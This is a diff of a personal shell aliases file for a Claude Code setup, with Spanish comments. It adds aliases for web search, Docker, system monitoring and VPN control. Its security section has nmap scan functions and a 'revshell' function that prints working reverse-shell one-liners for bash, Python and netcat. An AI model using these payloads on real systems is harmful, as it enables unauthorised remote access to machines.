@@ -1,9 +1,9 @@
-# Claude Code - Aliases Minimalistas
+# Claude Code - Aliases Completos
 
 # ============================================
 # Búsqueda Web (SearXNG)
 # ============================================
-alias s='searxng-search'           # Búsqueda web: s "query"
+alias s='searxng-search'           # Búsqueda web general
 
 # Búsquedas especializadas por motor
 alias cve='s "!exploit-db"'        # Buscar CVEs/exploits
@@ -19,26 +19,59 @@ alias go='s "!go"'                 # Google
 # ============================================
 alias cs='claude-backup sync'      # Sync config a git
 alias cc='claude-check'            # Verificar setup
+alias cb='claude-backup'           # Backup general
 
 # ============================================
 # SearXNG Control
 # ============================================
 alias xs='systemctl --user start searxng.service'
+alias xstop='systemctl --user stop searxng.service'
 alias xr='systemctl --user restart searxng.service'
+alias xstat='systemctl --user status searxng.service'
 alias xl='docker logs -f searxng'
 
 # ============================================
-# Security (para hacking/pentesting)
+# Security & Hacking
 # ============================================
-alias nq='sudo nmap -sV -sC'       # Quick nmap scan: nq 192.168.1.1
-alias ps='sudo nmap -p- --min-rate=1000 -T4'  # Full port scan
 
-# Reverse shell generator
+# Nmap quick scan
+nq() {
+    sudo nmap -sV -sC "$1"
+}
+
+# Full port scan
+portscan() {
+    sudo nmap -p- --min-rate=1000 -T4 "$1"
+}
+
+# Reverse shell generator (ethical use only)
 revshell() {
     local ip="${1:-127.0.0.1}" port="${2:-4444}"
-    echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
-    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+    echo "Bash: bash -i >& /dev/tcp/$ip/$port 0>&1"
+    echo "Python: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+    echo "NC: nc -e /bin/sh $ip $port"
 }
+
+# ============================================
+# Docker
+# ============================================
+alias d='docker'
+alias dlog='docker logs -f'
+alias dex='docker exec -it'
+
+# ============================================
+# System Monitoring
+# ============================================
+alias cpu='ps aux | sort -nr -k 3 | head -10'
+alias mem='ps aux | sort -nr -k 4 | head -10'
+alias listening='sudo netstat -tulpn | grep LISTEN'
+
+# ============================================
+# ProtonVPN
+# ============================================
+alias vpnc='protonvpn connect'
+alias vpnd='protonvpn disconnect'
+alias vpni='protonvpn info'
 
 # ============================================
 # Quick Utils
